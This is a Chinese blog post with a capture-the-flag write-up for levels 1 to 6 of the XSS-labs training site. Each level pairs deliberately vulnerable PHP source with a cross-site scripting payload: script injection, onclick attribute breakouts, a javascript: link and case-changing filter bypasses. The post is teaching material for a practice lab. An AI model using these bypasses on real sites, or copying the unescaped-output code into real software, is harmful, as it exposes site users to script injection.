<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XSSWriteUp | C3ngH's B10g</title><meta name="author" content="C3ngH"><meta name="copyright" content="C3ngH"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XSS-labs题解 网址：https:&#x2F;&#x2F;xsslab.ting.kim   Level 1 阅读源代码可以发现，name的值&quot;test&quot;由GET方法传递进入HTML的标签内，而例如、等标签内均可插入标签来执行JavaScript恶意代码 此处可以参考：XSS常见的触发标签  答案：&lt;script&gt;alert(1)&lt;&#x2F;script&gt; 源代码： 1234">
<meta property="og:type" content="article">
<meta property="og:title" content="XSSWriteUp">
<meta property="og:url" content="http://c3ngh.top/XSSWriteUp/index.html">
<meta property="og:site_name" content="C3ngH&#39;s B10g">
<meta property="og:description" content="XSS-labs题解 网址：https:&#x2F;&#x2F;xsslab.ting.kim   Level 1 阅读源代码可以发现，name的值&quot;test&quot;由GET方法传递进入HTML的标签内，而例如、等标签内均可插入标签来执行JavaScript恶意代码 此处可以参考：XSS常见的触发标签  答案：&lt;script&gt;alert(1)&lt;&#x2F;script&gt; 源代码： 1234">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
<meta property="article:published_time" content="2024-02-04T02:38:07.000Z">
<meta property="article:modified_time" content="2024-07-14T02:45:15.125Z">
<meta property="article:author" content="C3ngH">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg"><link rel="shortcut icon" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico"><link rel="canonical" href="http://c3ngh.top/XSSWriteUp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'XSSWriteUp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-14 10:45:15'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/BGimg.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="C3ngH's B10g"><span class="site-name">C3ngH's B10g</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSSWriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-04T02:38:07.000Z" title="发表于 2024-02-04 10:38:07">2024-02-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-14T02:45:15.125Z" title="更新于 2024-07-14 10:45:15">2024-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSSWriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="XSS-labs题解">XSS-labs题解</h3>
<p>网址：<a target="_blank" rel="noopener" href="https://xsslab.ting.kim/">https://xsslab.ting.kim</a></p>
<ul>
<li>
<p>Level 1</p>
<p>阅读源代码可以发现，name的值&quot;test&quot;由GET方法传递进入HTML的<h2>标签内，而例如<h2>、<div>等标签内均可插入<script>标签来执行JavaScript恶意代码</p>
<p>此处可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116462782">XSS常见的触发标签</a></p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202143032203.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202143032203.png" alt="image-20240202143032203"></a></p>
<p><strong>答案：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></strong></p>
<p>源代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;name&quot;];</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;//这里直接进行调用，根本没有过滤</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level1.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 2</p>
<p>可以尝试如Level 1的方法但是没有成功，再次查看源代码发现第一处的&lt;&gt;符号被html实体转义，只能从第二处进行注入，input标签不可内含script标签，故此处提前闭合input标签，构造一个新的script标签执行恶意代码。<a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706856310681.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1706856310681.png" alt="1706856310681"></a></p>
<p><strong>答案：<code>&quot;&gt;\&lt;script&gt;alert(1)\&lt;/script&gt;</code></strong></p>
<p>源代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level3.php?writing=wait&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 3</p>
<p>如下图所示，本题过滤了&lt;&gt;和&quot;，经过测试发现 ’ 未被过滤，则可以在input标签内内联JavaScript代码</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202144949589.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202144949589.png" alt="img"></a></p>
<p><strong>答案：<code>' onclick='alert(1)</code></strong>，然后使用鼠标单击该输入框即可</p>
<p>源代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level4.php?keyword=try harder!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level3.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 4</p>
<p>与Level 3相同，注意使用的是双引号即可</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202145526384.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202145526384.png" alt="image-20240202145526384"></a></p>
<p><strong>答案：<code>&quot; onclick=&quot;alert(1)</code></strong></p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 5</p>
<p>本题在先前基础上过滤了关键字 on ，使得所有带on的方法都不可使用，故使用伪协议构造&lt;a href=&gt;</p>
<p><strong>若过滤是被替换为空，则可进行双写绕过，若是增加下划线等破坏原有结构则需使用其他方法绕过</strong></p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/e51d1669fc381c1c00e22113b0f8bea.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/e51d1669fc381c1c00e22113b0f8bea.png" alt="e51d1669fc381c1c00e22113b0f8bea"></a></p>
<p><strong>答案：<code>&quot;&gt;&lt;a href=&quot;[javascript:alert(1)](about:blank)&quot;&gt;123&lt;/a&gt;//</code></strong>，其中//为注释后面的内容</p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 6</p>
<p>本题用增加下划线的方式过滤href标签，可采用大小写绕过</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202153331833.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202153331833.png" alt="image-20240202153331833"></a></p>
<p><strong>答案<code>&quot;&gt;&lt;a HREF=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;//</code></strong></p>
<p>源代码：</p>
